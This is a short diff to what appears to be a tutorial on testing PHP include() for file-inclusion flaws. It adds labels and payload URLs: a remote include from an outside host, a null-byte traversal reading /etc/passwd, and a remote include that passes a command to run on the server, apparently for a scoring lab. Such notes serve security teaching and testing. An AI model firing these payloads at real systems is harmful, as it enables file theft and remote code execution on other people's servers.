@@ -27,9 +27,12 @@ The function used is include().
 
 3. We can test for Remote File Include, by requesting an external resource: https://xxx.com/. We will see that it gets included inside the current page:
 
-- http://test.com/?page=http://xxx.com
+- http://test.com/?page=http://xxx.com (RFI)
 
 4. Using NULL BYTE (%00) - PHP solved this type of bypass since the version (5.3.4)
 
-http://test.com/?page=../../../../../../../etc/passwd%00 (LFI)
+- http://test.com/?page=../../../../../../../etc/passwd%00 (LFI)
+
+- http://test.com/?page=http://test.com/test_include_system.txt%00&c=/usr/local/bin/score%20f8eb195b-453d-4802-abfc-5ee5404b5a1a (RFI)
+
 
